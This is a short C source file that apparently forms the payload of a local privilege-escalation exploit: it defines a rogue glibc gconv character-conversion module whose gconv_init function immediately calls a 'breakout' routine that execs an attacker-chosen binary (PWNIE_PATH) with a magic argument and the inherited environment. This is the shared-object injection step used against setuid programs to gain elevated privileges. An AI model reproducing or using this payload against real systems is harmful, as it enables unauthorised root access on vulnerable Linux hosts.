#define _POSIX_C_SOURCE 200809L
#include <string.h>
#include <unistd.h>
#include <stdlib.h>
#include <gconv.h>

#include "constants.h"
#include "mypath.h"

extern char **environ;

static void breakout()
{
	char *arg0 = strdup(PWNIE_ARG0);
	execve(PWNIE_PATH, (char * const []) {arg0, strdup(MAGIC_PARAM), NULL}, environ);
}

int gconv_init(struct __gconv_step *step)
{
	breakout();
	return __GCONV_NOMEM;
}

/* only has to exist, is never called */
int gconv()
{
	return 0;
}
